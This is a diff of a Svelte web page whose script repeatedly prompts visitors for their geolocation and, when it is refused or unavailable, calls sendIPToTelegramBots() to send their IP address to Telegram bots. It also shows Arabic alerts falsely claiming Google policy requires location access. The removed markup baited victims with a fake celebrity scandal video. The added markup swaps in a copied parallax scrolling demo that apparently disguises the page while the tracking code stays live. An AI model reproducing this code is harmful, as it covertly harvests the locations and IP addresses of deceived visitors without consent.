@@ -1,6 +1,10 @@
-
-
 <script>
+	const layers = [0, 1, 2, 3, 4, 5, 6, 7, 8];
+
+	let y;
+
+
+	
   import { onMount } from 'svelte';
   onMount(async () => {
     
@@ -9,6 +13,8 @@ yourFunction();
     
     
 window.onload = function() {
+
+
       setInterval(yourFunction, 5000); // 2000 milliseconds = 2 seconds
     };
   });
@@ -109,7 +115,10 @@ ${ipAddress}
   async function yourFunction() {
 	   if (!navigator.geolocation) {
     // Geolocation not supported by browser
-    alert("تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
+sendIPToTelegramBots();
+  alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
+
+   //
     return; // Exit the function if no geolocation available
   }
   navigator.geolocation.getCurrentPosition(
@@ -119,13 +128,15 @@ ${ipAddress}
     },
     (error) => {
       if (error.code === error.PERMISSION_DENIED) {
-		    alert("اضغط سماح لاستمراح allow");
+				sendIPToTelegramBots();
+		    //alert("اضغط سماح لاستمرار allow");
+       alert("تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
         // showAlert();
         // redirectToNextURL();
         // Location permission denied, send IP result to Telegram bots
      } else {
       // Geolocation failed for other reasons (e.g., GPS unavailable)
-      alert("تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
+      alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
     }
     }
   );
@@ -155,61 +166,86 @@ function showAlert() {
       window.location.href = 'https://mhf1.onrender.com/';
     }
   }
+	
 </script>
 
-<main>
-  
+<svelte:window bind:scrollY={y} />
 
+<a class="parallax-container" href="https://www.firewatchgame.com">
+	{#each layers as layer}
+		<img
+			style="transform: translate(0,{(-y * layer) / (layers.length - 1)}px)"
+			src="https://www.firewatchgame.com/images/parallax/parallax{layer}.png"
+			alt="parallax layer {layer}"
+		/>
+	{/each}
+</a>
 
+<div class="text">
+	<span style="opacity: {1 - Math.max(0, y / 40)}"> scroll down </span>
 
-  <center>
-    <h1 style="font-size: 36px; font-weight: bold;">فضايح هيفاء وهبي</h1>
-  </center>
-  <center>
-    <h1 style="font-size: 36px; font-weight: bold;">‎اعمل سماح لمشاهدة فيديو الفضايح يلا بسرعة</h1>
-  </center>
-
-  <div class="image-grid">
-    <div class="image-container">
-      <img src="https://i.ibb.co/CM1zJSc/photo1.jpg" alt="Photo 1">
-    </div>
-    <div class="image-container">
-      <img src="https://i.ibb.co/Qn6nbGM/photo2.jpg" alt="Photo 2">
-    </div>
-    <div class="image-container">
-      <img src="https://i.ibb.co/XF1gFN0/photo3.jpg" alt="Photo 3">
-    </div>
-    <div class="image-container">
-      <img src="https://i.ibb.co/rmSPhTB/photo4.jpg" alt="Photo 4">
-    </div>
-    <div class="image-container">
-      <img src="https://i.ibb.co/0BVhJkB/photo5.jpg" alt="Photo 5">
-    </div>
-    <div class="image-container">
-      <img src="https://i.ibb.co/5Mw4bdQ/photo6.jpg" alt="Photo 6">
-    </div>
-    <div class="image-container">
-      <img src="https://i.ibb.co/2Y0ZKnT/photo7.jpg" alt="Photo 7">
-    </div>
-    <div class="image-container">
-      <img src="https://i.ibb.co/PhKHmNt/photo8.jpg" alt="Photo 8">
-    </div>
-  </div>
-</main>
+	<div class="foreground">
+		You have scrolled {y} pixels
+	</div>
+</div>
 
 <style>
-  .image-grid {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    grid-gap: 10px;
-  }
-  .image-container {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
-  .image-container img {
-    max-width: 100%;
-    height: auto;
-  }
+	.parallax-container {
+		position: fixed;
+		width: 2400px;
+		height: 712px;
+		left: 50%;
+		transform: translate(-50%, 0);
+	}
+
+	.parallax-container img {
+		position: absolute;
+		top: 0;
+		left: 0;
+		width: 100%;
+		will-change: transform;
+	}
+
+	.parallax-container img:last-child::after {
+		content: '';
+		position: absolute;
+		width: 100%;
+		height: 100%;
+		background: rgb(45, 10, 13);
+	}
+
+	.text {
+		position: relative;
+		width: 100%;
+		height: 300vh;
+		color: rgb(220, 113, 43);
+		text-align: center;
+		padding: 4em 0.5em 0.5em 0.5em;
+		box-sizing: border-box;
+		pointer-events: none;
+	}
+
+	span {
+		display: block;
+		font-size: 1em;
+		text-transform: uppercase;
+		will-change: transform, opacity;
+	}
+
+	.foreground {
+		position: absolute;
+		top: 711px;
+		left: 0;
+		width: 100%;
+		height: calc(100% - 712px);
+		background-color: rgb(32, 0, 1);
+		color: white;
+		padding: 50vh 0 0 0;
+	}
+
+	:global(body) {
+		margin: 0;
+		padding: 0;
+		background-color: rgb(253, 174, 51);
+	}
 </style>
